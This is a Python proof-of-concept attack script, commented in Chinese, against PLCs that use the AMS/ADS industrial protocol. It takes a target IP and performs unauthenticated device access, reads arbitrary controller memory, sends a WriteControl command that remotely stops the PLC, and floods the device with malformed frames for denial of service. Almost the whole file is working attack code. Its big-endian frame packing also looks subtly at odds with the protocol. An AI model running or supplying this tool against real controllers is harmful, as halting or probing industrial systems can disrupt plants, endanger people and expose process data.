"""
工控漏洞 POC - ADS (Automation Device Specification)
=====================================================
基于真实 AMS/ADS 协议的 POC 代码。

漏洞:
1. 未授权访问 — 无需认证连接 PLC
2. PLC 变量读取 — 读任意内存地址
3. WriteControl 状态篡改 — 远程 STOP PLC
4. 拒绝服务 — 畸形 AMS 帧

用法:
  python poc.py --target 192.168.1.100 --vuln unauthorized
  python poc.py --target 192.168.1.100 --vuln read --offset 0x1000
  python poc.py --target 192.168.1.100 --vuln stop  (远程 STOP PLC!)
  python poc.py --target 192.168.1.100 --vuln all
"""

import argparse
import socket
import struct
import sys
from typing import Optional

POC_VERSION = '1.0.0'

ADS_TCP_PORT = 48898
AMS_HEADER_LEN = 32
AMS_TCP_RESERVED = b'\x00\x00'


def fmt_net(net: str) -> bytes:
    parts = [int(x) for x in net.split('.')]
    while len(parts) < 6:
        parts.append(1)
    return bytes(parts[:6])


def build_ams_frame(target_net: str, target_port: int,
                    src_net: str, src_port: int,
                    cmd_id: int, payload: bytes, invoke: int) -> bytes:
    hdr = (fmt_net(target_net) + struct.pack('!H', target_port) +
           fmt_net(src_net) + struct.pack('!H', src_port) +
           struct.pack('!HHIII', cmd_id, 0x0001, len(payload), 0, invoke))
    ams_len = AMS_HEADER_LEN + len(payload)
    return AMS_TCP_RESERVED + struct.pack('!I', ams_len) + hdr + payload


class ADSPOC:
    """ADS POC"""

    def __init__(self, target: str, port: int = ADS_TCP_PORT,
                 target_net: str = '192.168.0.1.1.1', ams_port: int = 851):
        self.target = target
        self.port = port
        self.target_net = target_net
        self.ams_port = ams_port
        self.src_net = '10.0.0.99.1.1'
        self.src_port = 30000

    def _send(self, cmd: int, payload: bytes = b'') -> Optional[bytes]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))
            invoke = 0x1001
            s.sendall(build_ams_frame(self.target_net, self.ams_port,
                                      self.src_net, self.src_port,
                                      cmd, payload, invoke))
            resp = b''
            while len(resp) < 6:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
            if len(resp) >= 6:
                alen = struct.unpack_from('!I', resp, 2)[0]
                while len(resp) < 6 + alen:
                    c = s.recv(4096)
                    if not c:
                        break
                    resp += c
            s.close()
            return resp
        except Exception as e:
            print(f'[-] 通信异常: {e}')
            return None

    def poc_unauthorized(self) -> bool:
        print(f'\n[*] POC: ADS 未授权访问')
        resp = self._send(1)
        if resp and len(resp) >= 42:
            name = resp[42:58].rstrip(b'\x00').decode('utf-8', errors='replace')
            err = struct.unpack_from('!I', resp[6 + 24:6 + 28])[0] if len(resp) >= 34 else -1
            if err == 0:
                safe_name = name.encode('ascii', errors='replace').decode('ascii')
                print(f'[+] 未授权访问成功! 设备: {safe_name}')
                return True
        print('[-] 未授权访问失败')
        return False

    def poc_read(self, offset: int = 0x1000, length: int = 4) -> bool:
        print(f'\n[*] POC: PLC 变量读取 offset=0x{offset:04x}')
        payload = struct.pack('!III', 0x00000080, offset, length)
        resp = self._send(2, payload)
        if resp and len(resp) >= 42:
            val = resp[42:]
            if len(val) >= 4:
                as_int = struct.unpack('!I', val[:4])[0]
                as_float = struct.unpack('!f', val[:4])[0]
                print(f'[+] 读取成功: {val[:length].hex()}')
                print(f'    INT: {as_int} | FLOAT: {as_float:.4f}')
                return True
        print('[-] 读取失败')
        return False

    def poc_stop_plc(self) -> bool:
        print(f'\n[*] POC: ADS WriteControl — 远程停止 PLC！')
        print('[!] 警告: 此操作将停止目标 PLC 运行!')
        confirm = input('    确认? (yes/no): ')
        if confirm.lower() != 'yes':
            print('    已取消')
            return False
        payload = struct.pack('!HH', 6, 0) + b'\x00' * 4  # state=STOP
        resp = self._send(5, payload)
        if resp:
            print('[+] 远程 STOP 命令已发送!')
            return True
        print('[-] 命令发送失败')
        return False

    def poc_dos(self) -> bool:
        print(f'\n[*] POC: ADS 拒绝服务')
        count = 0
        for i in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((self.target, self.port))
                s.sendall(b'\xff' * 200 + struct.pack('!I', 0xFFFFFFFF) + b'\x00' * 500)
                s.close()
                count += 1
            except Exception:
                break
        print(f'[+] 发送 {count} 个畸形帧')
        return count > 0


def main():
    parser = argparse.ArgumentParser(description=f'ADS POC v{POC_VERSION}')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=ADS_TCP_PORT)
    parser.add_argument('--net-id', default='192.168.0.1.1.1')
    parser.add_argument('--ams-port', type=int, default=851)
    parser.add_argument('--vuln', required=True,
                        choices=['unauthorized', 'read', 'stop', 'dos', 'all'])
    parser.add_argument('--offset', type=lambda x: int(x, 16), default=0x1000)
    args = parser.parse_args()

    poc = ADSPOC(args.target, args.port, args.net_id, args.ams_port)
    print(f'ADS POC v{POC_VERSION} | 目标 {args.target}:{args.port}')
    print(f'AMS {args.net_id}:{args.ams_port}')

    vulns = {
        'unauthorized': ('未授权访问', poc.poc_unauthorized),
        'read': ('变量读取', lambda: poc.poc_read(args.offset)),
        'stop': ('远程STOP', poc.poc_stop_plc),
        'dos': ('拒绝服务', poc.poc_dos),
    }

    if args.vuln == 'all':
        for k, (name, fn) in vulns.items():
            ok = fn()
            print(f'  [{"+" if ok else "-"}] {name}\n')
    else:
        vulns[args.vuln][1]()


if __name__ == '__main__':
    main()
